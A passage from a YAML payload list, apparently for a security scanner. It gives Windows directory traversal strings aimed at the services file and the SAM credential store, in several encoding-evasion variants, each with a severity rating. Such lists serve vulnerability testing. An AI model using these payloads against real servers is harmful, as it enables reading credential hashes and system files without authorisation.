    - value: "..\\..\\..\\windows\\system32\\drivers\\etc\\services"
      description: "Services file"
      severity: medium
      tags: [basic, services]

  encoded:
    - value: "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
      description: "URL encoded backslash"
      severity: critical
      tags: [encoded, url]

    - value: "..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam"
      description: "URL encoded uppercase"
      severity: critical
      tags: [encoded, url]

    - value: "..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam"
      description: "Double URL encoded backslash"
      severity: critical
      tags: [encoded, double_url]

    - value: "..%2f..%2f..%2fwindows%2fsystem32%2fconfig%2fsam"
      description: "URL encoded forward slash"
      severity: critical
      tags: [encoded, url]

    - value: "..%c0%af..%c0%af..%c0%afwindows%c0%afsystem32%c0%afconfig%c0%afsam"
      description: "UTF-8 overlong slash"
      severity: critical
      tags: [encoded, utf8_overlong]

    - value: "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cconfig%c1%9csam"
      description: "UTF-8 overlong backslash"
      severity: critical
      tags: [encoded, utf8_overlong]

    - value: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fwindows%ef%bc%8fsystem32%ef%bc%8fconfig%ef%bc%8fsam"
      description: "Fullwidth slash"
      severity: critical
      tags: [encoded, fullwidth]

    - value: "%u002e%u002e%u005c%u002e%u002e%u005c%u002e%u002e%u005cwindows%u005csystem32%u005cconfig%u005csam"
      description: "Unicode %u encoding"
      severity: critical
      tags: [encoded, unicode]

    - value: "..\\..\\..\\windows\\system32\\config\\sam%00"
      description: "Null byte termination"
      severity: critical
      tags: [encoded, null_byte]

    - value: "..\\..\\..\\windows\\system32\\config\\sam%00.jpg"
      description: "Null byte with extension"
      severity: critical
      tags: [encoded, null_byte]

  unc_paths:
